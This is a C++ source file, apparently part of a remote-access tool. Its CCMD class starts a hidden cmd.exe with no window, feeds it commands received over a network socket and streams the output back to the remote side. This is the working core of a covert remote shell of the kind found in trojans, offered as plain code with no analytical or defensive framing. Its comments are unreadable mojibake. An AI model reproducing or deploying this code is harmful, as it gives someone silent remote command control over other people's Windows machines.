#include "CMD.h"
#include "protocol.h"
#include <stdio.h>

CCMD::CCMD(int s)
{
    m_cs = s;

    //�����ܵ�
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    BOOL bRet = CreatePipe(
        &m_hReadOrder,  //�����˾��
        &m_hWriteOrder, //д��˾��
        &sa,
        0); //ʹ��Ĭ�ϵĻ�������С

    bRet = CreatePipe(
        &m_hReadResult,  //�����˾��
        &m_hWriteResult, //д��˾��
        &sa,
        0); //ʹ��Ĭ�ϵĻ�������С

    //�򿪽���CMD
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = m_hReadOrder;
    si.hStdOutput = m_hWriteResult;
    ZeroMemory(&pi, sizeof(pi));

    //����CMD����
    TCHAR szName[] = { TEXT("cmd") };
    if (!CreateProcess(NULL, // No module name (use command line).
        szName, // Command line.
        NULL,             // Process handle not inheritable.
        NULL,             // Thread handle not inheritable.
        TRUE,            // Set handle inheritance to FALSE.
        CREATE_NO_WINDOW,                // No creation flags.
        NULL,             // Use parent's environment block.
        NULL,             // Use parent's starting directory.
        &si,              // Pointer to STARTUPINFO structure.
        &pi)             // Pointer to PROCESS_INFORMATION structure.
        )
    {
        MessageBox(NULL, TEXT("create CMD fail!"), NULL, MB_OK);
    }

}


CCMD::~CCMD()
{
}

DWORD WINAPI  ProcExecute(LPVOID lpParameter)//��ȡ������߳�
{
    CCMD* pThis = (CCMD*)lpParameter;

    //����ͷ
    HEADER head;
    head.nCmd = CMD_RESULT;
    send(pThis->m_cs, (char*)&head, sizeof(head), 0);
//    MessageBox(NULL, TEXT("send head "), NULL, MB_OK);
    DWORD dwToRead = 0;
    DWORD dwUsable = 0;  //�ܵ��п����ֽ���
    clock_t tBegin = clock();
    while (true)
    {
        clock_t tEnd = clock();
        if (tEnd - tBegin > 10000)//10���˳��߳�
        {
            return 0;
        }

        PeekNamedPipe(pThis->m_hReadResult, NULL, NULL, NULL, &dwUsable, NULL);

        //�õ����εĽ��
        char szTemp[0x1000] = { 0 };

        //����ܵ��л�������,���ȡ
        if (dwUsable > 0)
        {
            BOOL bRet = ReadFile(
                pThis->m_hReadResult,
                szTemp,
                sizeof(szTemp),
                &dwToRead,
                NULL);
            if (!bRet)
            {
                MessageBox(NULL, TEXT("read result fail!"), NULL, MB_OK);
            }

            send(pThis->m_cs, szTemp, strlen(szTemp), 0);
        }
    }
    return 0;
}

void CCMD::execute(char* pOrder)//ִ��ָ��
{
    DWORD dwToWrite = 0;
    BOOL bRet = WriteFile(
        m_hWriteOrder,
        pOrder,
        strlen(pOrder),
        &dwToWrite,
        NULL);
    if (!bRet)
    {
        MessageBox(NULL, TEXT("write order fail!"), NULL, MB_OK);
    }
    
    //�����߳����ڶ�ȡCMD����Ϣ
    DWORD dwThreadId = 0;
    HANDLE hThread = CreateThread(
        NULL,
        0, //ʹ��Ĭ��ջ��С,һ����1M,������ѡ��(��ջ������С)�����޸�
        (LPTHREAD_START_ROUTINE)ProcExecute,
        (LPVOID)this,
        0, //��������
        &dwThreadId);
    if (hThread == NULL)
    {
        MessageBox(NULL, TEXT("create thread fail!"), NULL, MB_OK);
    }


}
